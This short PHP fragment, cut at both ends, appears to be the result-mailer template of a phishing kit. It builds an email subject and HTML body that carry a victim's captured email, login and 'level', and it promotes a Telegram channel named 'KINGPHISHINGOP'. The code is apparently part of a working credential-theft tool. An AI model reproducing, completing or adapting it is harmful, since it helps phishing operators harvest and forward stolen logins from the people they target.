...
$subjek = "⚜️【KING】⚜️ |  IN  | +91 |  LEVEL $level | RESULT $email | LOGIN $login";
$pesan = '
<center> 
<div style="background: url(https://images.cooltext.com/5658784.gif) no-repeat center center; background-size: 100% 100%; width: 294; height: 300px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;"></div>
...
<a style="border:2px solid #000;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#0088CC;" href="https://t.me/KINGPHISHINGOP">TAP TO JOIN TELEGRAM</a>
</div>
 <center>
';
